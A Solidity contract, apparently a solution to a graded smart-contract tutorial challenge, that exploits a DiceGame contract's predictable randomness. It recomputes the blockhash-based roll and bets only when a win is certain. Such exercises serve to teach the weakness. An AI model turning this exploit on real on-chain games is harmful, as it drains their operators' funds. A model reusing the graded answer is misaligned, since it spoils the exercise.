pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;
    uint256 private immutable MIN_ROLL_PRICE;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
        MIN_ROLL_PRICE = diceGame.MIN_ROLL_PRICE();
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable recipient, uint256 amount) public onlyOwner {
        (bool sent, ) = recipient.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public payable {
        require(_enoughEther(), "Not enough Ether");
        require(_winnerRoll(), "Just keep trying");

        diceGame.rollTheDice{value: MIN_ROLL_PRICE}();
    }

    function _enoughEther() internal view returns (bool) {
        uint256 balance = address(this).balance + msg.value;
        return balance >= MIN_ROLL_PRICE;
    }

    function _winnerRoll() internal view returns (bool) {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        return roll <= 5;
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
